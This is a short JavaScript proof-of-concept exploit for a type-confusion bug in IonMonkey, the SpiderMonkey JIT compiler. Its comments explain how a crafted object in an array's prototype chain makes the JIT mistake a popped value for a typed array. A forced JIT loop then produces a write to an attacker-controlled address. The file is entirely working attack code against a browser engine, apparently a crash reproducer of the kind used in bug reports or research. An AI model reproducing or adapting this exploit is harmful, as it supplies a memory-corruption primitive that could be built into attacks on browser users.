// Run with --no-threads for increased reliability
let ab = new ArrayBuffer(0x1000);

// Confuse these two types with each other below.
let x = {buffer: ab, length: 13.39, byteOffset: 13.40, data: 3.54484805889626e-310};
let y = new Uint32Array(0x1000);

const v4 = [y, y, y, y, y];
function v7(v8,v9) {
    if (v4.length == 0) {
        v4[3] = y;
    }

    // pop the last value. IonMonkey will, based on inferred types, conclude that the result
    // will always be an object, which is untrue when p[0] is fetched here.
    const v11 = v4.pop();

    // It will then crash here when writing to a controlled address (0x414141414141).
    v11[0] = 0x1337; //crash point

    // Force JIT compilation.
    for (let v15 = 0; v15 < 100000 ; v15++) {}
}

var p = {};
p.__proto__ = [y, y, y];
p[0] = x;
v4.__proto__ = p;

for (let v31 = 0; v31 < 1000; v31++) {
    v7();
}